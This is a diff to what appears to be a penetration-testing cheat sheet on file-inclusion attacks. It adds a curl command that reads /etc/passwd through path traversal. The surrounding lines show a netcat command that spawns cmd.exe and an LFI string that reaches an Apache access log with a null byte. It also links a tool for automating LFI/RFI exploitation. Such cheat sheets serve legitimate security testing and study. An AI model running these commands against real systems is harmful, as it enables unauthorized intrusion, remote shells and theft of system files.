@@ -84,6 +84,9 @@ Connect via netcat to victim
      # nc -nv <[IP]> <[PORT]>) 
      # nc -nv <[IP]> <[PORT]> -e cmd.exe&LANG=../../../../../../../xampp/apache/logs/access.log%00
      
+LFI Through Curl
+     curl -X POST –k https://<IP ADDRESS>:<PORT>/file.php -d "file=../../../../../etc/passwd"
+     
 Fimap - There is a Python tool called fimap which can be leveraged to automate the exploitation of LFI/RFI vulnerabilities that are found in PHP (sqlmap for LFI):
      https://github.com/kurobeats/fimap    
           Gaining a shell from phpinfo()
